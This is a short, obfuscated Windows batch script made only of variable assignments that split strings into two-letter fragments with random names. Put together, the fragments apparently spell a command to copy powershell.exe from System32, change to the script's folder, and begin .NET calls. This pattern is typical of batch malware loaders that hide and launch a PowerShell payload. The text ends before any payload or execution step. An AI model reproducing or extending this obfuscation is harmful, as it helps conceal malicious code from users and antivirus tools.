@echo off
set "KgfiIyhjvb=st"
set "iROPrKUOgc=y "
set "IhLriqZXWr=rS"
set "veguMCpAFw=.e"
set "ObiTFgrhbJ=he"
set "tAnmMZbZbq=ll"
set "UNQWUIAOcV=\v"
set "paVGxkGlOF=po"
set "QlfllfkKPR=Po"
set "IwROZIJUbp=ow"
set "UYXvKSHKRw=Wi"
set "QVcOegMPsk=we"
set "aqXJqwKrnv=s\"
set "XKXCWYZBNa=we"
set "vHMXoHuxey= C"
set "pAVllnbfme=in"
set "sYPtXqxjxe=nd"
set "xNKvbaVnpM=rs"
set "ALNuohqCnr=:\"
set "XwiJoqJeJk=he"
set "jMIBwbagdB=em"
set "GfWbeYPjHx=32"
set "UqzJQtSdyA=ll"
set "BOqVqEkddJ=do"
set "JYBXoUpEWC=ws"
set "twoqwqSlak=py"
set "YjhLMdTVmz=co"
set "aJGIgBVtwX=Sy"
set "NpxeETlPbR=\W"
set "osWbQOMjjX=xe"
set "gnNyTBCnoG=1."
set "PFOIpgnaFH= /"
set "pUSDGhUyFj=0\"
set "FOvLLfkqTy=cd"
set "gqXPzrbiLy= %~dp0"
set "gWfMYsfRls=New-"
set "iYXifqkcQO=N.Su"
set "tojmoVkzGh='')("
set "fPYkhgOeqS=[Sys"
